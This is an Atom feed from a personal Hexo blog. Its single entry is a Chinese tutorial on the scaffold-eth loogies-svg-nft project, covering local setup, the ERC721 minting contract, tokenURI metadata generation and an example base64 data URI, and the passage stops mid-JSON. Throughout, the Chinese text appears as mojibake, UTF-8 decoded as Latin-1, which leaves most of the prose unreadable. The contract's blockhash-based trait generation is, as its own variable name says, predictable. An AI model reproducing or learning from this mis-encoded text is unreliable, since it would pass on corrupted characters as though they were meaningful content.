<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>QIWIHUI</title>
  
  <subtitle>Don&#39;t be evil or greedy.</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://qiwihui.com/"/>
  <updated>2024-05-15T02:25:31.470Z</updated>
  <id>https://qiwihui.com/</id>
  
  <author>
    <name>qiwihui</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SVG NFT å…¨é¢å®è·µ â”€â”€ scaffold-eth loogies-svg-nft é¡¹ç›®å®Œæ•´æŒ‡å—</title>
    <link href="https://qiwihui.com/qiwihui-blog-153/"/>
    <id>https://qiwihui.com/qiwihui-blog-153/</id>
    <published>2024-05-15T02:25:31.442Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>æ³¨ï¼šè¿™ç¯‡æ–‡ç« æ˜¯æˆ‘æŠ•ç¨¿äºâ€œæå¤§ç‹—Leeduckgoâ€å…¬ä¼—å·çš„æ–‡ç« ï¼ŒåŸæ–‡åœ°å€ï¼š<a href="https://mp.weixin.qq.com/s/WvTFk3E6FjfHtXfp2uHkrw">SVG NFT å…¨é¢å®è·µ | Web3.0 dApp å¼€å‘ï¼ˆå…­ï¼‰</a>ã€‚</p><hr><p>loogies-svg-nft æ˜¯ scaffold-eth æä¾›çš„ä¸€ä¸ªç®€å•çš„ NFT é“¸é€ å’Œå±•ç¤ºçš„é¡¹ç›®ï¼Œåœ¨æœ¬æ•™ç¨‹ä¸­ï¼Œæˆ‘ä»¬å°†å¸¦é¢†å¤§å®¶ä¸€æ­¥æ­¥åˆ†æå’Œå®ç°è¿™ä¸ªé¡¹ç›®ã€‚</p><p>ç”±äºé¡¹ç›®çš„ <code>loogies-svg-nft</code> åˆ†æ”¯ä¸ <code>master</code> åˆ†æ”¯åœ¨ç»„ä»¶åº“å’Œä¸»é¡µä¸Šæœ‰ä¸€äº›å˜åŒ–ï¼Œæ•…å…ˆå°† <code>master</code> åˆ†æ”¯ä»£ç ä¸ <code>loogies-svg-nft</code> åˆ†æ”¯è¿›è¡Œäº†åˆå¹¶ï¼Œè§£å†³å†²çªï¼Œå¾—åˆ°ä¸€ä»½åŸºæ–°ç»„ä»¶åº“çš„å…¨æ–°çš„ä»£ç ã€‚å¯ä»¥å‚è€ƒé¡¹ç›®åœ°å€ï¼š <a href="https://github.com/qiwihui/scaffold-eth.git">https://github.com/qiwihui/scaffold-eth.git</a> çš„ <code>loogies-svg-nft</code> åˆ†æ”¯ã€‚æœ¬æ–‡ä»¥ä¸‹å†…å®¹å°†åŸºäºè¿™äº›ä»£ç è¿›è¡Œéƒ¨ç½²å’Œåˆ†æã€‚</p><span id="more"></span><h2><span id="ben-di-yun-xing-he-ce-shi">æœ¬åœ°è¿è¡Œå’Œæµ‹è¯•</span></h2><p>é¦–å…ˆæˆ‘ä»¬å…ˆè¿è¡Œé¡¹ç›®æŸ¥çœ‹æˆ‘ä»¬å°†è¦åˆ†æå®ç°çš„åŠŸèƒ½ã€‚</p><h3><span id="ben-di-yun-xing">æœ¬åœ°è¿è¡Œ</span></h3><p>é¦–å…ˆæˆ‘ä»¬åœ¨æœ¬åœ°è¿è¡Œé¡¹ç›®ï¼š</p><p>clone é¡¹ç›®å¹¶åˆ‡æ¢åˆ° <code>loogies-svg-nft</code> åˆ†æ”¯ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/qiwihui/scaffold-eth.git loogies-svg-nft</span><br><span class="line"><span class="built_in">cd</span> loogies-svg-nft</span><br><span class="line">git checkout loogies-svg-nft</span><br></pre></td></tr></table></figure><p>å®‰è£…ä¾èµ–åŒ…</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn install</span><br></pre></td></tr></table></figure><p>è¿è¡Œå‰ç«¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn start</span><br></pre></td></tr></table></figure><p>åœ¨ç¬¬äºŒä¸ªç»ˆç«¯çª—å£ä¸­ï¼Œè¿è¡Œæœ¬åœ°æµ‹è¯•é“¾</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn chain</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/3297411/153822009-3154003e-6433-4a29-a511-b33b5f37a99a.png" alt="yarn-chain"></p><p>åœ¨ç¬¬ä¸‰ä¸ªç»ˆç«¯çª—å£ä¸­ï¼Œè¿è¡Œéƒ¨ç½²åˆçº¦</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn deploy</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/3297411/153822065-4c4a0ffa-95e3-4e16-8272-ace2f102625b.png" alt="yarn-deploy"></p><p>æ­¤æ—¶åœ¨æµè§ˆå™¨ä¸­è®¿é—® <a href="http://localhost:3000/"><code>http://localhost:3000</code></a> ï¼Œå°±å¯ä»¥çœ‹åˆ°ç¨‹åºäº†ã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/153822123-f6f7e3b0-ac6e-4625-a0bd-9bc4170d6aeb.png" alt="yarn-start"></p><h3><span id="ben-di-ce-shi">æœ¬åœ°æµ‹è¯•</span></h3><ol><li><p>é¦–å…ˆåœ¨ MetaMask é’±åŒ…ä¸­æ·»åŠ æœ¬åœ°ç½‘ç»œï¼Œå¹¶åˆ‡æ¢åˆ°æœ¬åœ°ç½‘ç»œï¼›</p><ul><li>ç½‘ç»œåç§°ï¼š <code>Localhost 8545</code></li><li>æ–°å¢ RPC URLï¼š <code>http://localhost:8545</code></li><li>é“¾ IDï¼š <code>31337</code></li><li>Currency Symbolï¼š <code>ETH</code></li></ul></li><li><p>åˆ›å»ºä¸€ä¸ªæ–°çš„æœ¬åœ°é’±åŒ…è´¦å·ï¼›</p></li><li><p>å¤åˆ¶é’±åŒ…åœ°å€ï¼Œåœ¨é¡µé¢å·¦ä¸‹è§’ç»™è¿™ä¸ªåœ°å€å‘é€ä¸€äº›æµ‹è¯• ETHï¼›</p></li><li><p>ç‚¹å‡»åœ¨é¡µé¢å³ä¸Šè§’ <code>connect</code> è¿æ¥é’±åŒ…ï¼›</p></li><li><p>ç‚¹å‡» Mint é“¸é€ ï¼›</p></li><li><p>å½“äº¤æ˜“æˆåŠŸåï¼Œå¯ä»¥çœ‹åˆ°æ–°é“¸é€ çš„ NFTï¼›</p><p><img src="https://user-images.githubusercontent.com/3297411/153822198-6442f4d1-fa49-43e1-bb7c-eacc1b1d082d.png" alt="nft-display"></p></li></ol><p>ä¸‹é¢ï¼Œæˆ‘ä»¬å¼€å§‹å¯¹é¡¹ç›®åˆçº¦è¿›è¡Œåˆ†æã€‚</p><h2><span id="loogies-he-yue-fen-xi">Loogies åˆçº¦åˆ†æ</span></h2><h3><span id="nft-yu-erc721">NFT ä¸ ERC721</span></h3><p><strong>NFT</strong>ï¼Œå…¨ç§°ä¸ºNon-Fungible Tokenï¼ŒæŒ‡éåŒè´¨åŒ–ä»£å¸ï¼Œå¯¹åº”äºä»¥å¤ªåŠä¸Š ERC-721 æ ‡å‡†ã€‚ ä¸€èˆ¬åœ¨æ™ºèƒ½åˆçº¦ä¸­ï¼ŒNFT çš„å®šä¹‰åŒ…å« <code>tokenId</code> å’Œ <code>tokenURI</code> ï¼Œæ¯ä¸€ä¸ª NFT çš„ <code>tokenId</code> æ˜¯å”¯ä¸€çš„ï¼Œ <code>tokenURI</code> å¯¹äºä¿å­˜äº†NFTçš„å…ƒæ•°æ®ï¼Œå¯ä»¥æ˜¯å›¾åƒURLã€æè¿°ã€å±æ€§ç­‰ã€‚å¦‚æœä¸€ä¸ª NFT æƒ³åœ¨ NFT å¸‚åœºä¸Šè¿›è¡Œå±•ç¤ºå’Œé”€å”®ï¼Œåˆ™ <code>tokenURI</code> å†…å®¹éœ€è¦å¯¹åº”ç¬¦åˆ NFT å¸‚åœºçš„æ ‡å‡†ï¼Œæ¯”å¦‚ï¼Œåœ¨ NFT å¸‚åœº OpenSea <a href="https://docs.opensea.io/docs/metadata-standards">å…ƒæ•°æ®æ ‡å‡†</a>ä¸­ï¼Œå°±æŒ‡å‡ºäº† NFT å±•ç¤ºéœ€è¦è®¾ç½®çš„å±æ€§ã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/153822292-ac9fa169-199b-49cb-b8bd-4ec3e680842c.png" alt="OpenSea ä¸­ NFT å…ƒæ•°æ®ä¸å±•ç¤ºå¯¹åº”å…³ç³»"></p><p>OpenSea ä¸­ NFT å…ƒæ•°æ®ä¸å±•ç¤ºå¯¹åº”å…³ç³»</p><h3><span id="he-yue-gai-lan">åˆçº¦æ¦‚è§ˆ</span></h3><p><a href="https://github.com/scaffold-eth/scaffold-eth/tree/loogies-svg-nft">loogies-svg-nft é¡¹ç›®</a>çš„åˆçº¦æ–‡ä»¶åœ¨ <code>packages/hardhat/contracts/</code> è·¯å¾„ä¸‹ï¼ŒåŒ…å«ä»¥ä¸‹ä¸‰ä¸ªæ–‡ä»¶ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">packages/hardhat/contracts/</span><br><span class="line">â”œâ”€â”€ HexStrings.sol</span><br><span class="line">â”œâ”€â”€ ToColor.sol</span><br><span class="line">â””â”€â”€ YourCollectible.sol</span><br></pre></td></tr></table></figure><ul><li><code>HexString.sol</code> ï¼šç”Ÿæˆåœ°å€å­—ç¬¦ä¸²ï¼›</li><li><code>ToColor.sol</code>ï¼šç”Ÿæˆé¢œè‰²ç¼–ç å­—ç¬¦ä¸²ï¼›</li><li><code>YourCollectible.sol</code>ï¼š <code>Loogies</code> NFTçš„åˆçº¦æ–‡ä»¶ï¼Œä¸»è¦åŠŸèƒ½æ¶‰åŠåˆçº¦é“¸é€ å’Œå…ƒæ•°æ®ç”Ÿæˆã€‚</li></ul><p>åˆçº¦çš„ä¸»è¦ç»“æ„å’Œæ–¹æ³•ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract YourCollectible is ERC721, Ownable &#123;</span><br><span class="line"></span><br><span class="line">// æ„é€ å‡½æ•°</span><br><span class="line">  constructor() public ERC721(&quot;Loogies&quot;, &quot;LOOG&quot;) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  // é“¸é€  NFT</span><br><span class="line">  function mintItem()</span><br><span class="line">      public</span><br><span class="line">      returns (uint256)</span><br><span class="line">  &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">// è·å– tokenId å¯¹åº” tokeURI</span><br><span class="line">  function tokenURI(uint256 id) public view override returns (string memory) &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">// ç”Ÿæˆ tokenId å¯¹åº” svg ä»£ç </span><br><span class="line">  function generateSVGofTokenById(uint256 id) internal view returns (string memory) &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">// ç”Ÿæˆ tokenId å¯¹åº” svg ä»£ç ï¼Œä¸»è¦ç”¨äºç»˜åˆ¶å›¾åƒ</span><br><span class="line">  function renderTokenById(uint256 id) public view returns (string memory) &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="gou-zao-han-shu">æ„é€ å‡½æ•°</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">constructor() public ERC721(&quot;Loogies&quot;, &quot;LOOG&quot;) &#123;</span><br><span class="line">    // RELEASE THE LOOGIES!</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>ä»£å¸ç¬¦å·ï¼š <code>Loogies</code></p><p>ä»£å¸åç§°ï¼š <code>LOOG</code></p><p>åˆçº¦ç»§æ‰¿è‡ª OpenZeppelin çš„ <code>ERC721.sol</code>ï¼Œè¿™æ˜¯ OpenZeppelin æä¾›çš„åŸºæœ¬åˆçº¦ä»£ç ï¼Œå¯ä»¥æ–¹ä¾¿å¼€å‘è€…ä½¿ç”¨ã€‚</p><h3><span id="ying-yong-ku-han-shu">åº”ç”¨åº“å‡½æ•°</span></h3><p>åˆçº¦ä¸­åˆ†åˆ«å¯¹ <code>uint256</code>ï¼Œ <code>uint160</code> å’Œ <code>bytes3</code> ç­‰åº”ç”¨äº†ä¸åŒåº“å‡½æ•°ï¼Œæ‰©å±•å¯¹åº”åŠŸèƒ½ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// ä½¿ uint256 å…·æœ‰ toHexString åŠŸèƒ½</span><br><span class="line">using Strings for uint256;</span><br><span class="line">// ä½¿ uint160 å…·æœ‰è‡ªå®šä¹‰ toHexString åŠŸèƒ½</span><br><span class="line">using HexStrings for uint160;</span><br><span class="line">// ä½¿ bytes3 å¯ä»¥æ–¹ä¾¿ç”Ÿæˆå‰ç«¯é¢œè‰²è¡¨ç¤º</span><br><span class="line">using ToColor for bytes3;</span><br><span class="line">// è®¡æ•°åŠŸèƒ½</span><br><span class="line">using Counters for Counters.Counter;</span><br></pre></td></tr></table></figure><h3><span id="mint-qi-xian">Mint æœŸé™</span></h3><p>ä»¥ä¸‹ä»£ç æ˜¯ Mint æ—¶é—´é™åˆ¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint256 mintDeadline = block.timestamp + 24 hours;</span><br><span class="line"></span><br><span class="line">function mintItem()</span><br><span class="line">      public</span><br><span class="line">      returns (uint256)</span><br><span class="line">  &#123;</span><br><span class="line">      require( block.timestamp &lt; mintDeadline, &quot;DONE MINTING&quot;);</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>åˆçº¦åœ¨éƒ¨ç½²ä¹‹åçš„24å°æ—¶å†…å¯ä»¥é“¸é€ ï¼Œè¶…è¿‡24å°æ—¶åˆ™ä¼šå¼•å‘å¼‚å¸¸ã€‚è¿™ä¸ªæœºåˆ¶ç±»ä¼¼äºé¢„å”®ï¼Œç”±äºè¿™ä¸ªåˆçº¦æ¯”è¾ƒç®€å•ï¼Œæ‰€ä»¥æ²¡æœ‰ä½¿ç”¨ç™½åå•æœºåˆ¶ï¼Œä¸€èˆ¬åœ¨å®é™…æƒ…å†µï¼Œä¼šä½¿ç”¨é¢„å”®å’Œç™½åå•çš„æ–¹å¼æ¥æ§åˆ¶ NFT çš„å‘è¡Œã€‚</p><h3><span id="mint-zhu-zao">Mint é“¸é€ </span></h3><p>é“¸é€  NFT å…¶å®å°±æ˜¯åœ¨åˆçº¦ä¸­è®¾ç½®ä¸¤ä¸ªä¿¡æ¯ï¼š</p><ul><li><code>tokenId</code> åŠå…¶ <code>owner</code></li><li><code>tokenId</code> åŠå…¶ <code>tokenURI</code></li></ul><p>æˆ‘ä»¬é¦–å…ˆçœ‹é“¸é€ å‡½æ•° <code>mintItem</code>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// ç”¨äºä¿å­˜æ¯ä¸€ä¸ªé“¸é€ çš„ Loogies çš„ç‰¹å¾ï¼Œå…¶ä¸­ï¼Œcolor è¡¨ç¤ºé¢œè‰²ï¼Œchubbiness è¡¨ç¤ºèƒ–ç˜¦</span><br><span class="line">mapping (uint256 =&gt; bytes3) public color;</span><br><span class="line">mapping (uint256 =&gt; uint256) public chubbiness;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">function mintItem()</span><br><span class="line">      public</span><br><span class="line">      returns (uint256)</span><br><span class="line">  &#123;</span><br><span class="line">      require( block.timestamp &lt; mintDeadline, &quot;DONE MINTING&quot;);</span><br><span class="line">// æ¯æ¬¡é“¸é€ å‰è‡ªå¢ _tokenIdsï¼Œç¡®ä¿ _tokenIds å”¯ä¸€</span><br><span class="line">      _tokenIds.increment();</span><br><span class="line"></span><br><span class="line">      uint256 id = _tokenIds.current();</span><br><span class="line">// é“¸é€ è€…ä¸ tokenId ç»‘å®š</span><br><span class="line">      _mint(msg.sender, id);</span><br><span class="line">// éšæœºç”Ÿæˆå¯¹åº” tokenId çš„å±æ€§</span><br><span class="line">      bytes32 predictableRandom = keccak256(abi.encodePacked( blockhash(block.number-1), msg.sender, address(this), id ));</span><br><span class="line">      color[id] = bytes2(predictableRandom[0]) | ( bytes2(predictableRandom[1]) &gt;&gt; 8 ) | ( bytes3(predictableRandom[2]) &gt;&gt; 16 );</span><br><span class="line">      chubbiness[id] = 35+((55*uint256(uint8(predictableRandom[3])))/255);</span><br><span class="line"></span><br><span class="line">      return id;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼š</p><ul><li><code>tokenId</code> åœ¨æ¯æ¬¡é“¸é€ æ—¶ä¼šè‡ªå¢ï¼Œç¡®ä¿ <code>tokenId</code> å”¯ä¸€ï¼›</li><li><code>_mint</code> å‡½æ•°ç»‘å®š <code>tokenId</code> åŠå…¶ <code>owner</code>ï¼›</li><li>æ¯ä¸€ä¸ª <code>tokenId</code> å¯¹åº”çš„å±æ€§é€šè¿‡éšæœºæ–¹å¼ç”Ÿæˆï¼Œå…·ä½“ä¸ºï¼š<ul><li>é€šè¿‡å‰ä¸€ä¸ªåŒºå—çš„å“ˆå¸Œï¼ˆ <code>blockhash(block.number-1)</code> ï¼‰ï¼Œå½“å‰é“¸é€ è´¦æˆ·ï¼ˆ <code>msg.sender</code>ï¼‰ï¼Œåˆçº¦åœ°å€ï¼ˆ <code>address(this)</code> ï¼‰å’Œ <code>tokenId</code> ç”Ÿæˆå“ˆå¸Œ <code>predictableRandom</code>ï¼›</li><li>è®¡ç®— NFT é¢œè‰²ï¼šæŒ‰ä½æˆ– <code>predictableRandom</code> å‰ä¸‰ä½å¾—åˆ°é¢œè‰²ï¼Œé¢œè‰²è¡¨ç¤ºç”¨ bytes3 è¡¨ç¤ºï¼Œå…¶ä¸­ <code>bytes2(predictableRandom[0])</code> å¯¹åº”æœ€ä½ä½è“è‰²æ•°å€¼ï¼Œ <code>( bytes2(predictableRandom[1]) &gt;&gt; 8 )</code>å¯¹åº”ä¸­é—´ä½ç»¿è‰²æ•°å€¼ï¼Œ <code>( bytes3(predictableRandom[2]) &gt;&gt; 16 )</code> å¯¹åº”æœ€é«˜ä½çº¢è‰²æ•°å€¼ï¼›</li><li>è®¡ç®— NFT èƒ–ç˜¦ï¼š <code>35+((55*uint256(uint8(predictableRandom[3])))/255);</code> ï¼Œ<code>uint8(predictableRandom[3])</code>ä»‹äº0~255ï¼Œæ•…æœ€å°å€¼ä¸º35ï¼Œæœ€å¤§å€¼ä¸º 35+55 = 90ï¼›</li></ul></li></ul><p>ä¾‹å¦‚ï¼š <code>color</code> ä¸º <code>0x4cc4c1</code> ï¼Œ <code>chubbiness</code> ä¸º 88 æ—¶å¯¹åº”çš„ NFT å›¾ç‰‡ä¸ºï¼š</p><p><img src="https://user-images.githubusercontent.com/3297411/153822433-3a1a41a4-f846-45f9-b74e-f699ccba6a81.png" alt="loogies-1"></p><h3><span id="tokenuri-han-shu">tokenURI å‡½æ•°</span></h3><p>å‡½æ•° <code>tokenURI</code> æ¥å— <code>tokenId</code> å‚æ•°ï¼Œè¿”å›ç¼–ç ä¹‹åçš„å…ƒæ•°æ®å­—ç¬¦ä¸²ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function tokenURI(uint256 id) public view override returns (string memory) &#123;</span><br><span class="line">// æ£€æŸ¥ id æ˜¯å¦å­˜åœ¨</span><br><span class="line">      require(_exists(id), &quot;not exist&quot;);</span><br><span class="line">      string memory name = string(abi.encodePacked(&#x27;Loogie #&#x27;,id.toString()));</span><br><span class="line">      string memory description = string(abi.encodePacked(&#x27;This Loogie is the color #&#x27;,color[id].toColor(),&#x27; with a chubbiness of &#x27;,uint2str(chubbiness[id]),&#x27;!!!&#x27;));</span><br><span class="line">      // ç”Ÿæˆå›¾ç‰‡çš„svg base64 ç¼–ç </span><br><span class="line">string memory image = Base64.encode(bytes(generateSVGofTokenById(id)));</span><br><span class="line"></span><br><span class="line">      return</span><br><span class="line">          string(</span><br><span class="line">              abi.encodePacked(</span><br><span class="line">                &#x27;data:application/json;base64,&#x27;,</span><br><span class="line">// é€šè¿‡ base64 ç¼–ç å…ƒæ•°æ®</span><br><span class="line">                Base64.encode(</span><br><span class="line">                    bytes(</span><br><span class="line">                          abi.encodePacked(</span><br><span class="line">                              &#x27;&#123;&quot;name&quot;:&quot;&#x27;,</span><br><span class="line">                              name,</span><br><span class="line">                              &#x27;&quot;, &quot;description&quot;:&quot;&#x27;,</span><br><span class="line">                              description,</span><br><span class="line">                              &#x27;&quot;, &quot;external_url&quot;:&quot;https://burnyboys.com/token/&#x27;,</span><br><span class="line">                              id.toString(),</span><br><span class="line">                              &#x27;&quot;, &quot;attributes&quot;: [&#123;&quot;trait_type&quot;: &quot;color&quot;, &quot;value&quot;: &quot;#&#x27;,</span><br><span class="line">                              color[id].toColor(),</span><br><span class="line">                              &#x27;&quot;&#125;,&#123;&quot;trait_type&quot;: &quot;chubbiness&quot;, &quot;value&quot;: &#x27;,</span><br><span class="line">                              uint2str(chubbiness[id]),</span><br><span class="line">                              &#x27;&#125;], &quot;owner&quot;:&quot;&#x27;,</span><br><span class="line">                              (uint160(ownerOf(id))).toHexString(20),</span><br><span class="line">                              &#x27;&quot;, &quot;image&quot;: &quot;&#x27;,</span><br><span class="line">                              &#x27;data:image/svg+xml;base64,&#x27;,</span><br><span class="line">                              image,</span><br><span class="line">                              &#x27;&quot;&#125;&#x27;</span><br><span class="line">                          )</span><br><span class="line">                        )</span><br><span class="line">                    )</span><br><span class="line">              )</span><br><span class="line">          );</span><br><span class="line">  &#125;</span><br><span class="line">// ç”Ÿæˆçš„ SVG å­—ç¬¦ä¸²</span><br><span class="line">function generateSVGofTokenById(uint256 id) internal view returns (string memory) &#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// ç»˜åˆ¶å›¾åƒ</span><br><span class="line">// Visibility is `public` to enable it being called by other contracts for composition.</span><br><span class="line">function renderTokenById(uint256 id) public view returns (string memory) &#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œ <code>generateSVGofTokenById</code> å‡½æ•°è¿”å› <code>tokenId</code> å¯¹åº”çš„é¢œè‰²å’Œèƒ–ç˜¦å±æ€§ç”Ÿæˆçš„ SVG å­—ç¬¦ä¸²ï¼Œ <code>renderTokenById</code> ç”¨æˆ·ç»˜åˆ¶å›¾åƒã€‚</p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒNFT å…ƒæ•°æ®ä¸­åŒ…å«çš„å±æ€§æœ‰ï¼š</p><ul><li>nameï¼šåç§°</li><li>descriptionï¼š æè¿°</li><li>external_urlï¼šå¤–éƒ¨é“¾æ¥</li><li>attributesï¼šå±æ€§<ul><li>color é¢œè‰²</li><li>chubbinessï¼šèƒ–ç˜¦</li><li>ownerï¼šæ‰€æœ‰è€…ï¼Œä»¥å¤ªåŠåœ°å€16è¿›åˆ¶å½¢å¼</li><li>imageï¼šå›¾ç‰‡å¯¹åº” SVG çš„ base64 ç¼–ç </li></ul></li></ul><p>è¿™é‡Œï¼Œæˆ‘ä»¬é€šè¿‡å®é™…æ•°æ®äº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯ SVGã€‚<code>tokenId</code> ä¸º 1 æ—¶å¯¹åº”çš„ <code>tokenURI</code> ç»“æœä¸ºï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">data:application/json;<span class="built_in">base64</span>,eyJuYW1lIjoiTG9vZ2llICMxIiwiZGVzY3JpcHRpb24iOiJUaGlzIExvb2dpZSBpcyB0aGUgY29sb3IgIzRjYzRjMSB3aXRoIGEgY2h1YmJpbmVzcyBvZiA4OCEhISIsImV4dGVybmFsX3VybCI6Imh0dHBzOi8vYnVybnlib3lzLmNvbS90b2tlbi8xIiwiYXR0cmlidXRlcyI6W3sidHJhaXRfdHlwZSI6ImNvbG9yIiwidmFsdWUiOiIjNGNjNGMxIn0seyJ0cmFpdF90eXBlIjoiY2h1YmJpbmVzcyIsInZhbHVlIjo4OH1dLCJvd25lciI6IjB4MTY5ODQxYWEzMDI0Y2ZhNTcwMDI0ZWI3ZGQ2YmY1Zjc3NDA5MjA4OCIsImltYWdlIjoiZGF0YTppbWFnZS9zdmcreG1sO2Jhc2U2NCxQSE4yWnlCM2FXUjBhRDBpTkRBd0lpQm9aV2xuYUhROUlqUXdNQ0lnZUcxc2JuTTlJbWgwZEhBNkx5OTNkM2N1ZHpNdWIzSm5Mekl3TURBdmMzWm5JajQ4WnlCcFpEMGlaWGxsTVNJK1BHVnNiR2x3YzJVZ2MzUnliMnRsTFhkcFpIUm9QU0l6SWlCeWVUMGlNamt1TlNJZ2NuZzlJakk1TGpVaUlHbGtQU0p6ZG1kZk1TSWdZM2s5SWpFMU5DNDFJaUJqZUQwaU1UZ3hMalVpSUhOMGNtOXJaVDBpSXpBd01DSWdabWxzYkQwaUkyWm1aaUl2UGp4bGJHeHBjSE5sSUhKNVBTSXpMalVpSUhKNFBTSXlMalVpSUdsa1BTSnpkbWRmTXlJZ1kzazlJakUxTkM0MUlpQmplRDBpTVRjekxqVWlJSE4wY205clpTMTNhV1IwYUQwaU15SWdjM1J5YjJ0bFBTSWpNREF3SWlCbWFXeHNQU0lqTURBd01EQXdJaTgrUEM5blBqeG5JR2xrUFNKb1pXRmtJajQ4Wld4c2FYQnpaU0JtYVd4c1BTSWpOR05qTkdNeElpQnpkSEp2YTJVdGQybGtkR2c5SWpNaUlHTjRQU0l5TURRdU5TSWdZM2s5SWpJeE1TNDRNREEyTlNJZ2FXUTlJbk4yWjE4MUlpQnllRDBpT0RnaUlISjVQU0kxTVM0NE1EQTJOU0lnYzNSeWIydGxQU0lqTURBd0lpOCtQQzluUGp4bklHbGtQU0psZVdVeUlqNDhaV3hzYVhCelpTQnpkSEp2YTJVdGQybGtkR2c5SWpNaUlISjVQU0l5T1M0MUlpQnllRDBpTWprdU5TSWdhV1E5SW5OMloxOHlJaUJqZVQwaU1UWTRMalVpSUdONFBTSXlNRGt1TlNJZ2MzUnliMnRsUFNJak1EQXdJaUJtYVd4c1BTSWpabVptSWk4K1BHVnNiR2x3YzJVZ2NuazlJak11TlNJZ2NuZzlJak1pSUdsa1BTSnpkbWRmTkNJZ1kzazlJakUyT1M0MUlpQmplRDBpTWpBNElpQnpkSEp2YTJVdGQybGtkR2c5SWpNaUlHWnBiR3c5SWlNd01EQXdNREFpSUhOMGNtOXJaVDBpSXpBd01DSXZQand2Wno0OEwzTjJaejQ9In0=</span><br></pre></td></tr></table></figure><p>é€šè¿‡ base64 è§£ç  <code>data:application/json;base64,</code> ä¹‹åçš„å­—ç¬¦ä¸²å¯ä»¥å¾—åˆ°å¦‚ä¸‹ jsonï¼ˆä»¥ä¸‹ json ç»è¿‡äº†æ ¼å¼åŒ–ï¼Œæ–¹ä¾¿é˜…è¯»ï¼‰ï¼š</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Loogie #1&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;This Loogie is the color #4cc4c1 with a chubbiness of 88!!!&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;external_url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://burnyboys.com/token/1&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;attributes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;color&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#4cc4c1&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;chubbiness&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">88</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;owner&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0x169841aa3024cfa570024eb7dd6bf5f774092088&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;image&quot;</span><span class="punctuation">:</span> <span 